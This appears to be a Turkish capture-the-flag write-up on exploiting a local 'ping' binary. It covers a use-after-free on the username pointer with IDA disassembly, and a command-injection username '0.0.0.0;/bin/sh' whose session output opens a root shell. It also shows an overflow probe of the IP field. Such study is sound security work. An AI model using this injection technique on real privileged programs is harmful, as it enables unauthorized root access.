@@ -1,0 +1,127 @@
+şimdiki örnekte free edilen pointer'ın dangling durumuna düşmesi,
+dangling pointer olmasının sebebi geri NULL'a atanmamasından kaynaklıdır.
+
+bize ping attırmayı sağlayan bu binary'deki sorun şu kod bloğunda oluşmakta.
+Program açıldığında username soruyor.Giriyoruz 3 seçeneğimiz var.
+1)Set Ip
+2) Pingle
+3) çıkış yap.
+
+Pinglemeyi ip belirlemeden yapamıyoruz.
+1. seçeneği tıklayıp 1.2.3.4 dedik tıkladığımızda çıktı geliyor.
+subprocess'de çalıştırıyor demek oluyor bu.
+Öyleyse biz buraya komut yollayabilirsek onu çalıştıracaktır.
+IDA Pro programında açtığımda şu satırlar dikkatimi çekti.
+
+.text:0000000000400AB1 sub_400AB1      proc near               ; CODE XREF:
+.text:0000000000400AB1                 push    rbp
+.text:0000000000400AB2                 mov     rbp, rsp
+.text:0000000000400AB5                 mov     edi, offset aLoggedOutDoYou ; "Logged out!\nDo you want to quit too Y/"...
+.text:0000000000400ABA                 mov     eax, 0
+.text:0000000000400ABF                 call    printf
+.text:0000000000400AC4                 mov     rax, cs:ptr
+.text:0000000000400ACB                 test    rax, rax
+.text:0000000000400ACE                 jz      short loc_400ADF
+.text:0000000000400AD0                 mov     rax, cs:ptr
+.text:0000000000400AD7                 mov     rdi, rax        ; ptr
+.text:0000000000400ADA                 call    free
+
+
+burada free tek başına çağrılıyor.
+Bu logout yaptığımızda username'i freeliyor.
+Demekki username'in içine command yollayabilirsem bana sonuç verecektir.
+Şöyle bir senaryo oluşturdum.
+
+login ol
+ip'i seç 1.2.3.4 sonra logout ol username'i 0.0.0.0;/bin/sh yazıp gir.
+ping komutunu çalıştır.
+çıktısı şöyle oldu.
+
+[echelon@blackarch bin]$ sudo ./ping 
+====Login====
+Enter username: echelon_1881
+Logged in!
+
+Ping! Welcome echelon_1881
+===============
+1) Set IP
+2) Ping
+3) Logout
+
+#> 1
+Enter IP-address: 0.0.0.0
+IP set! Ready to ping
+
+Ping! Welcome echelon_1881
+===============
+1) Set IP
+2) Ping
+3) Logout
+
+#> 3
+Logged out!
+Do you want to quit too Y/N?:n
+====Login====
+Enter username: 0.0.0.0;/bin/sh
+Logged in!
+
+Ping! Welcome 0.0.0.0;/bin/sh
+===============
+1) Set IP
+2) Ping
+3) Logout
+
+#> 2
+PING 0.0.0.0 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.021 ms
+
+--- 0.0.0.0 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.021/0.021/0.021/0.000 ms
+sh-4.4# ls
+ping
+ping.id0
+ping.id1
+ping.nam
+ping.til
+sh-4.4# whoami
+root
+sh-4.4# 
+
+tabi overflow da oluyor.
+bunu farkettikten sonra IP set edilen yer de overflow olabileceğini düşündüm.
+neresi ne kadar yer kaplıyor olabileceğini hesaplamak gerekiyor.
+denedim başarılı oldum, fakat /bin/sh çalıştırmadım.
+örnek çıktı şu şekilde.
+
+Ping! Welcome 6.36.3.63.63.6.36.36.36.3.6.36.36.3.63.63.6.3.63.63.6.36.3.63.6.36.36.3.63.6.36.36.3.63.6.36.36.3.6.36.3.63.6.36.36.3.6.36.3.63.6.36.3.6.36.3.63.6.36.3.6.36.3.63.6.3.63.6.3.63.6.36.3.63.6.36.3.6.36.3.63.6.36.3.6.36.3.63.6.36.3.63.6.36.36.3.63.63.6.36;/bin/===============
+1) Set IP
+2) Ping
+3) Logout
+
+#> 
+Ping! Welcome 6.36.3.63.63.6.36.36.36.3.6.36.36.3.63.63.6.3.63.63.6.36.3.63.6.36.36.3.63.6.36.36.3.63.6.36.36.3.6.36.3.63.6.36.36.3.6.36.3.63.6.36.3.6.36.3.63.6.36.3.6.36.3.63.6.3.63.6.3.63.6.36.3.63.6.36.3.6.36.3.63.6.36.3.6.36.3.63.6.36.3.63.6.36.36.3.63.63.6.36;/bin/===============
+1) Set IP
+2) Ping
+3) Logout
+
+#> 2
+Usage: ping [-aAbBdDfhLnOqrRUvV64] [-c count] [-i interval] [-I interface]
+            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
+            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
+            [-w deadline] [-W timeout] [hop1 ...] destination
+Usage: ping -6 [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
+             [-l preload] [-m mark] [-M pmtudisc_option]
+             [-N nodeinfo_option] [-p pattern] [-Q tclass] [-s packetsize]
+             [-S sndbuf] [-t ttl] [-T timestamp_option] [-w deadline]
+             [-W timeout] destination
+
+Ping! Welcome 6.36.3.63.63.6.36.36.36.3.6.36.36.3.63.63.6.3.63.63.6.36.3.63.6.36.36.3.63.6.36.36.3.63.6.36.36.3.6.36.3.63.6.36.36.3.6.36.3.63.6.36.3.6.36.3.63.6.36.3.6.36.3.63.6.3.63.6.3.63.6.36.3.63.6.36.3.6.36.3.63.6.36.3.6.36.3.63.6.36.3.63.6.36.36.3.63.63.6.36;/bin/===============
+1) Set IP
+2) Ping
+3) Logout
+
+#> 
+
+görüldüğü üzere biraz daha üzerinde oynama yaparsak ping komutunun yazdığı yeri de
+overwrite yapabiliriz.
